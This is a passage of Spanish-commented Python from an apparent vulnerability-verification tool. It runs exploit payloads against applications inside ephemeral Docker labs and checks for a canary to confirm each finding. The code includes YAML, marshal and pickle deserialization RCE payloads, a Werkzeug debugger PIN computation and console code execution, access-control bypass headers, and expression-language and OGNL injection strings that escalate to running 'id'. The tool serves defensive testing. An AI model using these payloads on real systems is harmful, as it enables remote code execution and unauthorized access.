    _yaml_payload = (
        f"!!python/object/apply:os.system\n"
        f"- 'echo {_canary_tok} > {_canary_path}'\n"
    )

    # marshal RCE: compile a code object that writes canary
    _marshal_payload = b""
    try:
        import marshal as _marshal
        _code_src = (
            f"import os\n"
            f"os.system('echo {_canary_tok} > {_canary_path}')\n"
        )
        _co = compile(_code_src, "<marshal>", "exec")
        _marshal_payload = _marshal.dumps(_co)
    except Exception:
        pass

    _payloads = [
        ("pickle-raw",          _raw_pickle,                        content_type),
        ("pickle-base64",       _b64_pickle.encode(),               "text/plain"),
        ("pickle-hex",          _hex_pickle.encode(),               "text/plain"),
        ("yaml-unsafe",         _yaml_payload.encode(),             "application/yaml"),
        # Raw body variants — many endpoints read request.body directly
        ("pickle-raw-body",     _raw_pickle,                        "application/octet-stream"),
        ("pickle-b64-body",     _b64_pickle.encode(),               "application/x-www-form-urlencoded"),
    ] + (
        [("marshal-raw", _marshal_payload, "application/octet-stream")]
        if _marshal_payload else []
    )

    lab = None
    try:
        pass  # _DockerLab is defined in this file
        lab = _DockerLab(source_dir, dockerfile_body or None,
                         extra_files=extra_files or {},
                         setup_commands=setup_commands or [], on_step=step)
        with lab.running() as boot:
            import requests as _rq

            for _pl_name, _pl_data, _pl_ct in _payloads:
                step(f"probando deserialización {_pl_name} → {endpoint}...")
                try:
                    headers = {"Content-Type": _pl_ct}
                    _raw_body_mode = "body" in _pl_name or "marshal" in _pl_name
                    if http_method.upper() == "GET":
                        r = _rq.get(boot.base_url + endpoint,
                                    params={inject_param: _pl_data}, timeout=15)
                    elif _raw_body_mode:
                        # Send payload as raw request body, not form-encoded
                        r = _rq.request(http_method.upper(), boot.base_url + endpoint,
                                        headers=headers, data=_pl_data, timeout=15)
                    else:
                        r = _rq.request(http_method.upper(), boot.base_url + endpoint,
                                        headers=headers, data={inject_param: _pl_data},
                                        timeout=15)
                except Exception as e:
                    step(f"  error: {e}")
                    continue

                _found = lab.find_in_webroot(_canary_tok[:8])
                if not _found:
                    # Also check /tmp directly
                    _check = lab.exec_in_container(
                        f"sh -c 'cat {_canary_path} 2>/dev/null'")
                    if _canary_tok in (_check or ""):
                        _found = _canary_path
                if _found:
                    res.verified = True
                    res.ok = True
                    res.evidence.update({
                        "payload_type": _pl_name,
                        "endpoint": endpoint,
                        "canary_path": _canary_path,
                        "canary_found_at": _found,
                        "status_code": r.status_code,
                        "respuesta_cuerpo_recorte": (r.text or "")[:300],
                    })
                    step(f"VERIFICADO — Python deserialization RCE con {_pl_name}: "
                         f"canario encontrado en {_found}")
                    return res

            res.ok = True
            res.detail = (f"python-deserialization: 4 variantes de payload enviadas a "
                          f"{endpoint}, canario {_canary_tok[:8]}… no encontrado en contenedor")
            step("python-deserialization: no verificado — ningún payload provocó escritura de canario")
            return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_python_deserialization: {e}"
        return res
    finally:
        step("desmontando el laboratorio (python-deserialization)...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# verify_generic_werkzeug_debug_rce
# ---------------------------------------------------------------------------

def verify_generic_werkzeug_debug_rce(
    source_dir: str,
    debugger_endpoint: str = "/__debugger__",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
) -> WpVerifyResult:
    """Verifica RCE via consola interactiva del debugger de Werkzeug/Flask.

    Estrategia:
    1. Arranca el lab efimero con la app Flask/Werkzeug en modo debug.
    2. Verifica que el debugger está expuesto (GET /__debugger__ devuelve 200).
    3. Intenta ejecutar código Python directamente vía la consola
       (funciona si WERKZEUG_DEBUG_PIN=off o el PIN está desactivado).
    4. Si el PIN está activo, intenta leer /etc/machine-id + /proc/self/cgroup
       para calcular el PIN por fuerza bruta (CVE-2024-34069 specific: pin bypass).
    5. VERIFICADO si puede ejecutar código arbitrario y el canario aparece en la respuesta.
    """
    import secrets as _sec
    import hashlib as _hash

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    _canary = _sec.token_hex(10)

    lab = None
    try:
        pass  # _DockerLab is defined in this file
        lab = _DockerLab(source_dir, dockerfile_body or None,
                         extra_files=extra_files or {},
                         setup_commands=setup_commands or [], on_step=step)
        with lab.running() as boot:
            import requests as _rq

            # Step 1: Check debugger is exposed
            try:
                r_check = _rq.get(boot.base_url + debugger_endpoint, timeout=10)
            except Exception as e:
                res.detail = f"werkzeug-debug: debugger endpoint unreachable: {e}"
                return res

            if r_check.status_code != 200 or "debugger" not in r_check.text.lower():
                res.detail = (f"werkzeug-debug: endpoint {debugger_endpoint} returned "
                              f"{r_check.status_code} — debugger not exposed or disabled")
                res.ok = True
                return res

            step(f"debugger expuesto en {debugger_endpoint} → intentando ejecutar código Python...")

            # Step 2: Try console without PIN (WERKZEUG_DEBUG_PIN=off)
            _console_ep = f"{debugger_endpoint}/console?__debugger__=yes"
            _code_to_exec = f"import os; os.system('echo {_canary} > /tmp/wz_canary.txt')"

            try:
                r_console = _rq.get(boot.base_url + _console_ep, timeout=10)
                _has_console = r_console.status_code == 200 and "console" in r_console.text.lower()
            except Exception:
                _has_console = False

            if _has_console:
                # Try to execute code via console POST
                try:
                    r_exec = _rq.post(
                        boot.base_url + _console_ep,
                        data={"cmd": _code_to_exec},
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        timeout=15,
                    )
                    _check = lab.exec_in_container("cat /tmp/wz_canary.txt 2>/dev/null")
                    if _canary in (_check or "") or _canary in (r_exec.text or ""):
                        res.verified = True
                        res.ok = True
                        res.evidence.update({
                            "debugger_endpoint": debugger_endpoint,
                            "console_endpoint": _console_ep,
                            "pin_required": False,
                            "code_executed": _code_to_exec,
                            "canary": _canary,
                            "status_code": r_exec.status_code,
                        })
                        step(f"VERIFICADO — Werkzeug debug console RCE (sin PIN): canario '{_canary}' ejecutado")
                        return res
                except Exception as e:
                    step(f"  error POST a console: {e}")

            # Step 3: Try to compute PIN from container internals
            # Read /etc/machine-id and /proc/self/cgroup to determine app UUID
            _machine_id = lab.exec_in_container(
                "sh -c 'cat /etc/machine-id 2>/dev/null || cat /proc/sys/kernel/random/boot_id 2>/dev/null'")
            _cgroup = lab.exec_in_container(
                "cat /proc/self/cgroup 2>/dev/null")
            _mac = lab.exec_in_container(
                "sh -c 'cat /sys/class/net/eth0/address 2>/dev/null || ip link show eth0 2>/dev/null | grep link/ether | awk \"{print \\$2}\"'")

            if _machine_id and _mac:
                step("intentando calcular PIN de Werkzeug desde machine-id + MAC...")
                _machine_id = _machine_id.strip()
                _mac_int = int(_mac.strip().replace(":", ""), 16)
                # Werkzeug PIN calculation (CVE-2024-34069 PIN bypass technique)
                # Requires: MAC address (as int), machine-id/cgroup ID, app module path
                _probably_public = [str(_mac_int), _machine_id]
                _rv_hash = _hash.sha1()
                for _val in _probably_public:
                    _rv_hash.update(_val.encode())
                _rv_hash.update(b"cookiesalt")
                _num = int(_rv_hash.hexdigest(), 16)
                _pin_candidate = "-".join([
                    str(_num % 10 ** 3).zfill(3),
                    str((_num // 10 ** 3) % 10 ** 3).zfill(3),
                    str((_num // 10 ** 6) % 10 ** 3).zfill(3),
                ])
                step(f"PIN candidato: {_pin_candidate} — probando...")
                try:
                    # Try to unlock with computed PIN (response not used)
                    _rq.post(
                        boot.base_url + _console_ep,
                        data={"pin": _pin_candidate, "__debugger__": "yes"},
                        timeout=10,
                    )
                    r_exec2 = _rq.post(
                        boot.base_url + _console_ep,
                        data={"cmd": _code_to_exec, "pin": _pin_candidate,
                              "__debugger__": "yes"},
                        timeout=15,
                    )
                    _check2 = lab.exec_in_container("cat /tmp/wz_canary.txt 2>/dev/null")
                    if _canary in (_check2 or "") or _canary in (r_exec2.text or ""):
                        res.verified = True
                        res.ok = True
                        res.evidence.update({
                            "debugger_endpoint": debugger_endpoint,
                            "pin_computed": _pin_candidate,
                            "machine_id": _machine_id,
                            "mac_int": str(_mac_int),
                            "code_executed": _code_to_exec,
                            "canary": _canary,
                        })
                        step(f"VERIFICADO — Werkzeug debug console RCE con PIN calculado: '{_pin_candidate}'")
                        return res
                except Exception as e:
                    step(f"  error probando PIN: {e}")

            res.evidence.update({
                "debugger_exposed": True,
                "debugger_endpoint": debugger_endpoint,
                "console_accessible": _has_console,
                "machine_id_read": bool(_machine_id),
            })
            res.ok = True
            res.detail = (f"werkzeug-debug: debugger expuesto en {debugger_endpoint} "
                          "(potential attack surface) pero no se pudo ejecutar código — "
                          "PIN activo y no calculable desde el laboratorio")
            step("werkzeug-debug: debugger expuesto pero no se pudo ejecutar código")
            return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_werkzeug_debug_rce: {e}"
        return res
    finally:
        step("desmontando el laboratorio (werkzeug-debug)...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# verify_generic_broken_access_control
# ---------------------------------------------------------------------------

def verify_generic_broken_access_control(
    source_dir: str,
    endpoint: str,
    http_method: str = "GET",
    confirm_string: str = "",
    admin_endpoint: str = "",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
    bola_id_param: str = "",
    bola_victim_id: str = "2",
) -> WpVerifyResult:
    """Verifica Broken Access Control / BOLA (Broken Object Level Authorization).

    Estrategia:
    1. Arranca el lab.
    2. Prueba acceso al endpoint sin autenticación (sin credenciales).
    3. Prueba con HTTP method override (X-HTTP-Method-Override: GET/DELETE/PUT).
    4. Prueba con cabeceras de bypass comunes: X-Forwarded-For: 127.0.0.1,
       X-Original-URL, X-Rewrite-URL, X-Custom-IP-Authorization.
    5. Busca confirm_string o respuesta 200 donde se esperaría 401/403.
    6. VERIFICADO si se obtiene acceso a un recurso restringido.
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    _BYPASS_HEADERS = [
        {},  # sin bypass
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Original-URL": endpoint},
        {"X-Rewrite-URL": endpoint},
        {"X-Override-URL": endpoint},
        {"X-HTTP-Method-Override": "GET"},
        {"X-Method-Override": "GET"},
        {"X-Forwarded-For": "127.0.0.1", "X-Original-URL": endpoint},
        # Proxy-auth headers used by apps like Paperless-ngx (REMOTE_USER mode), Authelia, etc.
        {"X-Remote-User": "admin"},
        {"X-User": "admin"},
        {"X-Auth-User": "admin"},
        {"Remote-User": "admin"},
    ]

    _target_endpoints = [endpoint]
    if admin_endpoint:
        _target_endpoints.append(admin_endpoint)
    # Path normalization bypass variants
    _ep_clean = endpoint.rstrip("/")
    _path_variants = [
        endpoint,
        endpoint + "/",
        endpoint + "//",
        _ep_clean + "%2f",
        _ep_clean + "..;/",
        # URL-encode the last path segment
        endpoint.replace("/", "%2f", 1) if "/" in endpoint[1:] else endpoint,
    ]

    lab = None
    try:
        pass  # _DockerLab is defined in this file
        lab = _DockerLab(source_dir, dockerfile_body or None,
                         extra_files=extra_files or {},
                         setup_commands=setup_commands or [], on_step=step)
        with lab.running() as boot:
            import requests as _rq

            # --- BOLA (IDOR) sequential-ID probe ---
            if bola_id_param:
                for _victim_id in (bola_victim_id, "1", "2", "3"):
                    _bola_ep = endpoint
                    if bola_id_param in ("id", "user_id", "userId"):
                        _bola_url = f"{boot.base_url}{_bola_ep}?{bola_id_param}={_victim_id}"
                    else:
                        # Try as path param: /api/users/2
                        _bola_url = f"{boot.base_url}{_bola_ep}/{_victim_id}"
                    try:
                        _bola_r = _rq.get(_bola_url, timeout=10)
                        _bola_body = _bola_r.text or ""
                        if confirm_string and confirm_string in _bola_body:
                            res.verified = True
                            res.ok = True
                            res.evidence.update({
                                "bypass_type": "bola-idor",
                                "victim_id": _victim_id,
                                "endpoint": _bola_url,
                                "status_code": _bola_r.status_code,
                                "respuesta_cuerpo_recorte": _bola_body[:400],
                            })
                            step(f"VERIFICADO — BOLA/IDOR: acceso a recurso de usuario {_victim_id} "
                                 f"sin autorización vía {_bola_url}")
                            return res
                    except Exception:
                        pass

            # Probe path variants first (no special headers needed)
            for _pv in _path_variants[1:]:  # skip original — covered in main loop
                try:
                    _pv_r = _rq.request(http_method.upper(), boot.base_url + _pv, timeout=10)
                    _pv_body = _pv_r.text or ""
                    if confirm_string and confirm_string in _pv_body and _pv_r.status_code in range(200, 400):
                        res.verified = True
                        res.ok = True
                        res.evidence.update({
                            "bypass_type": "path-variant",
                            "path_variant": _pv,
                            "status_code": _pv_r.status_code,
                            "respuesta_cuerpo_recorte": _pv_body[:400],
                        })
                        step(f"VERIFICADO — broken access control path variant: {_pv}")
                        return res
                except Exception:
                    pass

            for _ep in _target_endpoints:
                for _hdrs in _BYPASS_HEADERS:
                    try:
                        r = _rq.request(http_method.upper(), boot.base_url + _ep,
                                        headers=_hdrs, timeout=10, allow_redirects=False)
                    except Exception:
                        continue
                    body = r.text or ""
                    # Success: 200 or 201 where we'd expect 401/403, with confirm_string
                    _is_success = r.status_code in (200, 201, 204)
                    _has_confirm = bool(confirm_string and confirm_string in body)
                    _deny_body = any(w in body.lower() for w in
                                     ("unauthorized", "forbidden", "access denied",
                                      "not allowed", "permission denied"))
                    _is_bypass = bool(_hdrs)  # actual bypass header used (not baseline probe)
                    # verified=True requires: HTTP success + confirm_string explicitly found
                    # If no confirm_string: set ok=True only (suspicious, not verified) when
                    # a bypass header produced success with no deny words — avoids FP on public endpoints
                    if _is_success:
                        if _has_confirm:
                            res.verified = True
                            res.ok = True
                        elif _is_bypass and not _deny_body and not confirm_string:
                            res.ok = True  # suspicious only — no confirmed secret to validate against
                        else:
                            continue
                        res.evidence.update({
                            "endpoint": _ep,
                            "bypass_headers": _hdrs,
                            "status_code": r.status_code,
                            "confirm_string_found": _has_confirm,
                            "respuesta_cuerpo_recorte": body[:400],
                        })
                        _bypass_desc = (f"cabeceras de bypass: {_hdrs}"
                                        if _hdrs else "sin autenticación")
                        if _has_confirm:
                            step(f"VERIFICADO — broken access control en {_ep} "
                                 f"({_bypass_desc}): {r.status_code}")
                            if body:
                                res.evidence["weaponization"] = {
                                    "technique": "broken_access_control_bypass",
                                    "data": {
                                        "endpoint": _ep,
                                        "bypass_method": _bypass_desc,
                                        "response_snippet": body[:400],
                                        "status_code": r.status_code,
                                    },
                                    "impact": (
                                        f"Unauthorized access to {_ep} without authentication "
                                        f"({_bypass_desc}) — HTTP {r.status_code}: "
                                        f"{body[:100]}"
                                    ),
                                }
                            return res
                        elif res.ok and not res.verified:
                            # Suspicious (bypass succeeded without confirm_string) — keep
                            # probing for a better signal, don't return early
                            step(f"  sospechoso — {_ep} devolvió {r.status_code} con {_bypass_desc} "
                                 f"pero sin confirm_string")
            res.ok = True
            res.detail = (f"broken-access-control: todas las combinaciones de bypass en "
                          f"{endpoint} devuelven 401/403 o no se obtuvo confirm_string")
            step("broken-access-control: no verificado — no se obtuvo acceso no autorizado")
            return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_broken_access_control: {e}"
        return res
    finally:
        step("desmontando el laboratorio (broken-access-control)...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# verify_generic_expression_language_injection
# ---------------------------------------------------------------------------

def verify_generic_expression_language_injection(
    source_dir: str,
    endpoint: str,
    http_method: str = "POST",
    inject_param: str = "query",
    el_prefix: str = "${{",
    el_suffix: str = "}}",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
) -> WpVerifyResult:
    """Verifica Expression Language (EL) injection para Spring SpEL, JSP EL, Thymeleaf, etc.

    Genera payloads matemáticos de verificación (8341 + 1337 = 9678) y los prueba en
    múltiples notaciones EL: Spring SpEL, Thymeleaf, JSP EL, FreeMarker, Velocity.
    VERIFICADO si la respuesta contiene el resultado calculado.
    """
    import secrets as _sec

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    _a = _sec.randbelow(9000) + 1000
    _b = _sec.randbelow(9000) + 1000
    _expected = _a + _b

    # EL payload variants across different frameworks
    # Base variants from inline payloads
    _EL_BASE = [
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{T(java.lang.Math).sqrt(1234)}",
        f"${{1 * {_a} + {_b}}}",
        f"#{{{_a} + {_b}}}",
        f"__${{{_a} + {_b}}}__::~{{}}/",
        f"${{{_a} + {_b}}}",
        f"<#assign ex='freemarker.template.utility.Execute'?new()>${{ex('{_a}+{_b}')}}",
        f"#set($x = {_a} + {_b})${{x}}",
        f"#set($y = {_a})#set($z = {_b})#set($r = $y + $z)${{r}}",
        f"{_a}+{_b}",
        # OGNL / Apache Struts2
        f"%{{{_a}+{_b}}}",
        f"%{{(#context['com.opensymphony.xwork2.ActionContext.application'])[{_a}+{_b}]}}",
        f"%{{@java.lang.Math@abs({_a})+@java.lang.Math@abs({_b})}}",
        # Pebble template engine (Java)
        f"{{% set x = {_a} + {_b} %}}{{{{ x }}}}",
        # MVEL expression language
        f"({_a} + {_b})",
        # JSP/JSTL expression
        f"${{param.x + {_b}}}",
    ]
    # Extended variants from payload_kb
    try:
        from .payload_kb import load_el_injection_payloads as _lel
        _EL_KB = _lel(_a, _b)
    except Exception:
        _EL_KB = []
    _EL_VARIANTS = list(dict.fromkeys(_EL_BASE + _EL_KB))
    _pat = re.compile(rf"(?<!\d){_expected}(?!\d)")

    lab = None
    try:
        pass  # _DockerLab is defined in this file
        lab = _DockerLab(source_dir, dockerfile_body or None,
                         extra_files=extra_files or {},
                         setup_commands=setup_commands or [], on_step=step)
        with lab.running() as boot:
            import requests as _rq

            # Baseline probe: check if the expected sum already appears in an
            # uninjected response (static HTML port/constant). If so, re-roll the
            # operands to avoid a false positive. Max 3 retries.
            _baseline_body = ""
            try:
                _r_base = _rq.get(boot.base_url + endpoint, timeout=8)
                _baseline_body = _r_base.text or ""
            except Exception:
                pass
            for _retry in range(3):
                if not _pat.search(_baseline_body):
                    break
                _a = _sec.randbelow(9000) + 1000
                _b = _sec.randbelow(9000) + 1000
                _expected = _a + _b
                _pat = re.compile(rf"(?<!\d){_expected}(?!\d)")
                # Rebuild payloads with new operands
                _EL_BASE = [
                    "${T(java.lang.Runtime).getRuntime().exec('id')}",
                    "#{T(java.lang.Math).sqrt(1234)}",
                    f"${{1 * {_a} + {_b}}}",
                    f"#{{{_a} + {_b}}}",
                    f"__${{{_a} + {_b}}}__::~{{}}/",
                    f"${{{_a} + {_b}}}",
                    f"#set($x = {_a} + {_b})${{x}}",
                    f"%{{{_a}+{_b}}}",
                    f"{{% set x = {_a} + {_b} %}}{{{{ x }}}}",
                    f"({_a} + {_b})",
                ]
                try:
                    from .payload_kb import load_el_injection_payloads as _lel
                    _EL_KB = _lel(_a, _b)
                except Exception:
                    _EL_KB = []
                _EL_VARIANTS = list(dict.fromkeys(_EL_BASE + _EL_KB))
                step(f"baseline ya contiene {_expected} — re-generando operandos ({_retry+1}/3)")

            _el_waf = _WafGuard()
            for _pl in _EL_VARIANTS:
                if _el_waf.is_blocked:
                    break
                step(f"probando EL payload: {_pl[:40]}…")
                body = ""
                r = None
                try:
                    if http_method.upper() == "GET":
                        r = _rq.get(boot.base_url + endpoint,
                                    params={inject_param: _pl}, timeout=10)
                        body = r.text or ""
                    else:
                        # Try form-encoded first
                        r = _rq.request(http_method.upper(), boot.base_url + endpoint,
                                        data={inject_param: _pl}, timeout=10)
                        body = r.text or ""
                        # Also try JSON body injection if form-encoded didn't match
                        if not _pat.search(body):
                            try:
                                import json as _json_mod
                                r_j = _rq.request(
                                    http_method.upper(), boot.base_url + endpoint,
                                    headers={"Content-Type": "application/json"},
                                    data=_json_mod.dumps({inject_param: _pl}), timeout=10)
                                _jbody = r_j.text or ""
                                if _pat.search(_jbody):
                                    body = _jbody
                                    r = r_j
                                    res.evidence["injection_mode"] = "json_body"
                            except Exception:
                                pass
                except Exception as e:
                    step(f"  error: {e}")
                    continue
                if r is not None and _el_waf.check(r, step):
                    break
                if _pat.search(body):
                    res.verified = True
                    res.ok = True
                    res.evidence.update({
                        "endpoint": endpoint,
                        "payload_ganador": _pl,
                        "resultado_esperado": _expected,
                        "status_code": r.status_code,
                        "respuesta_cuerpo_recorte": body[:400],
                    })
                    step(f"VERIFICADO — EL injection: resultado {_expected} encontrado "
                         f"con payload '{_pl[:40]}'")
                    # --- RCE escalation phase ---
                    # Try to execute `id` to elevate from EL→RCE
                    _RCE_PAYLOADS = [
                        "${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'})}",
                        "${T(java.lang.ProcessBuilder).class.newInstance(['sh','-c','id']).start()}",
                        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
                        "${@java.lang.Runtime@getRuntime().exec('id')}",
                        # Groovy
                        '${"id".execute().text}',
                        # Pebble/Jinja2-style fallback
                        '{{ "id" | system }}',
                        # OGNL / Struts2
                        "%{(#abc)(new java.lang.ProcessBuilder(new java.lang.String[]{'sh','-c','id'})).start()}",
                        "%{(#container=#context['com.opensymphony.xwork2.ActionContext.application'])(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))(#ognlUtil.setExcludedClasses(''))(#ognlUtil.setExcludedPackageNames(''))(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))(#rt=@java.lang.Runtime@getRuntime())(#rt.exec('id'))}",
                        # EL with Runtime (alternative class loader bypass)
                        "${T(Thread).currentThread().getContextClassLoader().loadClass('java.lang.Runtime').getMethod('exec',T(String)).invoke(T(Runtime).getRuntime(),'id')}",
                    ]
                    _id_re = re.compile(r"uid=\d+\(\w+\)")
                    for _rce_pl in _RCE_PAYLOADS:
                        try:
                            if http_method.upper() == "GET":
                                _rce_r = _rq.get(boot.base_url + endpoint,
                                                  params={inject_param: _rce_pl}, timeout=10)
                            else:
                                _rce_r = _rq.request(http_method.upper(),
                                                      boot.base_url + endpoint,
                                                      data={inject_param: _rce_pl}, timeout=10)
                            _rce_body = _rce_r.text or ""
                            _id_match = _id_re.search(_rce_body)
                            if _id_match:
                                res.evidence["el_rce_id_output"] = _id_match.group(0)
                                res.evidence["el_rce_payload"] = _rce_pl
                                step(f"EL→RCE CONFIRMADO: id={_id_match.group(0)}")
                                break
                        except Exception:
                            pass
                    return res

            res.ok = True
            res.detail = (f"el-injection: {len(_EL_VARIANTS)} payloads probados en "
                          f"{endpoint}, resultado {_expected} no encontrado en ninguna respuesta")
            step("expression-language injection: no verificado")
            return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_expression_language_injection: {e}"
        return res
    finally:
        step("desmontando el laboratorio (EL injection)...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# verify_generic_race_condition
# ---------------------------------------------------------------------------

def verify_generic_race_condition(
    source_dir: str,
    endpoint: str,
    http_method: str = "POST",
    race_params: Optional[dict] = None,
    confirm_string: str = "",
    concurrent_requests: int = 20,
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
    double_redemption_endpoint: str = "",
    double_redemption_key: str = "",
) -> WpVerifyResult:
    """Verifica race condition / TOCTOU mediante rafaga de peticiones concurrentes.

    Envia `concurrent_requests` peticiones en paralelo al endpoint y busca:
    - confirm_string en alguna respuesta (indica que la carrera se gano)
    - Respuestas inconsistentes (diferentes status codes o cuerpos distintos)
      que indican que el estado del servidor no es atómico.
    VERIFICADO si se obtiene confirm_string en alguna respuesta de la rafaga.
    """
    import threading as _thr

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    _params = race_params or {}
    _results: list = []
    _lock = _thr.Lock()

    lab = None
    try:
        pass  # _DockerLab is defined in this file
        lab = _DockerLab(source_dir, dockerfile_body or None,
                         extra_files=extra_files or {},
                         setup_commands=setup_commands or [], on_step=step)
        with lab.running() as boot:
            import requests as _rq

            _use_json = bool(_params and any(isinstance(v, dict) for v in _params.values()))
            _meth = http_method.upper()
            _url = boot.base_url + endpoint

            # Use a Barrier so all threads release simultaneously (Last Frame Sync technique)
            # This maximises the probability of the race window being hit
            def _make_burst(n: int, barrier: _thr.Barrier) -> list:
                _burst_results: list = []
                _blast_lock = _thr.Lock()

                def _fire():
                    # Pre-open connection (warm up TCP before the barrier)
                    try:
                        _sess = _rq.Session()
                        _sess.headers.update({"Connection": "keep-alive"})
                        # Warm up: HEAD request to establish the TCP connection
                        try:
                            _sess.head(_url, timeout=5)
                        except Exception:
                            pass
                        barrier.wait(timeout=10)  # synchronize burst
                        r = _sess.request(_meth, _url,
                                          data=_params if not _use_json else None,
                                          json=_params if _use_json else None,
                                          timeout=15)
                        with _blast_lock:
                            _burst_results.append({"status": r.status_code, "body": (r.text or "")[:400]})
                    except _thr.BrokenBarrierError:
                        pass
                    except Exception as exc:
                        with _blast_lock:
                            _burst_results.append({"status": -1, "error": str(exc)})

                ts = [_thr.Thread(target=_fire) for _ in range(n)]
                for t in ts:
                    t.start()
                for t in ts:
                    t.join(timeout=25)
                return _burst_results

            # Fire 3 synchronized bursts with slightly increasing sizes to widen race window
            _burst_sizes = [concurrent_requests, concurrent_requests + 10, concurrent_requests + 20]
            for _bi, _bsz in enumerate(_burst_sizes):
                step(f"rafaga {_bi + 1}/3: {_bsz} peticiones sincronizadas (barrier) a {endpoint}...")
                _barrier = _thr.Barrier(_bsz)
                _batch = _make_burst(_bsz, _barrier)
                _results.extend(_batch)

                # Check after each burst
                for r in _batch:
                    if confirm_string and confirm_string in r.get("body", ""):
                        _all_statuses = [x["status"] for x in _results]
                        _uniq = {s for s in _all_statuses if s != -1}
                        _ok_count = sum(1 for s in _all_statuses if s in (200, 201, 204))
                        res.verified = True
                        res.ok = True
                        res.evidence.update({
                            "endpoint": endpoint,
                            "burst_round": _bi + 1,
                            "concurrent_requests": _bsz,
                            "winning_response": r["body"],
                            "status_codes_distribution": str(_uniq),
                            "success_count": _ok_count,
                        })
                        step(f"VERIFICADO — race condition ganada en rafaga {_bi + 1} "
                             f"({_bsz} threads sincronizados, barrier)")
                        return res

            statuses = [r["status"] for r in _results]
            _success_count = sum(1 for s in statuses if s in (200, 201, 204))
            _uniq_statuses = {s for s in statuses if s != -1}

            # Double-redemption check: requires EITHER a check endpoint that confirms
            # the second success (double_redemption_key found in its response) OR
            # confirm_string present in at least 2 concurrent responses. A bare
            # _success_count >= 2 out of 50 requests is not sufficient — any normal
            # stateless POST endpoint will return 200 for every request in the burst.
            if _success_count >= 2:
                # Optionally confirm via a check endpoint (e.g. GET /balance shows double credit)
                _dr_body = ""
                _dr_key_found = False
                if double_redemption_endpoint:
                    try:
                        import requests as _rq2
                        _dr_r = _rq2.get(boot.base_url + double_redemption_endpoint, timeout=10)
                        _dr_body = _dr_r.text[:300]
                        _dr_key_found = bool(double_redemption_key and _dr_body
                                             and double_redemption_key in _dr_body)
                    except Exception:
                        pass
                # Count how many bursts saw confirm_string — if ≥2 it's proven
                _confirm_hits = sum(1 for r in _results
                                    if confirm_string and confirm_string in r.get("body", ""))
                _double_proven = _dr_key_found or _confirm_hits >= 2
                if not _double_proven:
                    # Can't distinguish race from a naturally idempotent endpoint
                    _uniq_statuses = _uniq_statuses  # keep for inconclusive detail
                    res.ok = True
                    res.detail = (f"race-condition: {_success_count} peticiones con 2xx pero sin "
                                  f"prueba de doble ejecucion (double_redemption_key no hallado, "
                                  f"confirm_string <2 hits) — inconclusivo")
                    return res
                res.verified = True
                res.ok = True
                res.evidence.update({
                    "endpoint": endpoint,
                    "double_redemption_proven": True,
                    "successful_requests": _success_count,
                    "total_requests": len(_results),
                    "status_codes_distribution": str(_uniq_statuses),
                    "double_redemption_check_body": _dr_body,
                    "double_redemption_key_found": _dr_key_found,
                })
                step(f"VERIFICADO — double-redemption: {_success_count}/{len(_results)} peticiones "
                     f"aceptadas (mismo token/coupon/credito usado mas de una vez)")
                return res

            # Inconsistency detection (no confirm_string but state corruption observed)
            # More than 2 distinct status codes in a uniform request set → non-atomic state
            if len(_uniq_statuses) > 2 and _success_count > 0:
                res.evidence.update({
                    "endpoint": endpoint,
                    "total_requests": len(_results),
                    "status_codes_distribution": str(_uniq_statuses),
                    "inconsistency_detected": True,
                    "success_count": _success_count,
                })
                res.confidence = "probable"
                step(f"race condition PROBABLE: {len(_uniq_statuses)} status codes distintos "
                     f"en {len(_results)} peticiones → estado no atómico")

            res.ok = True
            res.detail = (f"race-condition: {len(_results)} peticiones sincronizadas en 3 rafagas "
                          f"({'+'.join(str(b) for b in _burst_sizes)}), confirm_string no encontrada. "
                          f"Status distribution: {_uniq_statuses}")
            return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_race_condition: {e}"
        return res
    finally:
        step("desmontando el laboratorio (race-condition)...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# verify_generic_account_takeover
